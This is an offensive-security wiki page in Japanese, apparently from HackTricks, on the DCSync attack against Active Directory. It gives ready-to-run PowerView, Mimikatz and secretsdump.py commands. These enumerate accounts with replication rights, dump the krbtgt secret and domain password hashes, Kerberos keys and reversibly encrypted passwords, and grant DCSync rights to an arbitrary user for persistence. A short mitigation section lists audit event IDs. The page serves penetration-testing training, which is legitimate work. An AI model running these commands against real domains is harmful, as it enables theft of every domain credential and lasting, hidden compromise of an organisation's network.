# DCSync

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築し、自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync**権限は、ドメイン自体に対して以下の権限を持つことを意味します：**DS-Replication-Get-Changes**、**Replicating Directory Changes All**、および**Replicating Directory Changes In Filtered Set**。

**DCSyncに関する重要な注意事項：**

- **DCSync攻撃は、ドメインコントローラーの動作をシミュレートし、他のドメインコントローラーに情報を複製するよう要求します**。これは、ディレクトリ複製サービスリモートプロトコル（MS-DRSR）を使用します。MS-DRSRはActive Directoryの有効かつ必要な機能であるため、オフにしたり無効にしたりすることはできません。
- デフォルトでは、**Domain Admins、Enterprise Admins、Administrators、およびDomain Controllers**グループのみが必要な特権を持っています。
- もしアカウントのパスワードが可逆暗号化で保存されている場合、Mimikatzにはパスワードを平文で返すオプションがあります。

### Enumeration

`powerview`を使用して、これらの権限を持つユーザーを確認します：
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### ローカルでのエクスプロイト
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### リモートでのエクスプロイト
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` は3つのファイルを生成します：

- **NTLMハッシュ**を含むファイル
- **Kerberosキー**を含むファイル
- [**可逆暗号化**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)が有効なアカウントのNTDSからの平文パスワードを含むファイル。可逆暗号化を持つユーザーを取得するには、次のコマンドを使用します。

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 永続性

ドメイン管理者であれば、`powerview`の助けを借りてこの権限を任意のユーザーに付与できます：
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
次に、(「ObjectType」フィールド内に特権の名前が表示されるはずです) の出力で、ユーザーが3つの特権を正しく割り当てられているかどうかを**確認できます**:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (オブジェクトの監査ポリシーを有効にする必要があります) – オブジェクトに対して操作が行われました
- Security Event ID 5136 (オブジェクトの監査ポリシーを有効にする必要があります) – ディレクトリサービスオブジェクトが変更されました
- Security Event ID 4670 (オブジェクトの監査ポリシーを有効にする必要があります) – オブジェクトの権限が変更されました
- AD ACL Scanner - ACLの作成と比較レポートを作成します。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
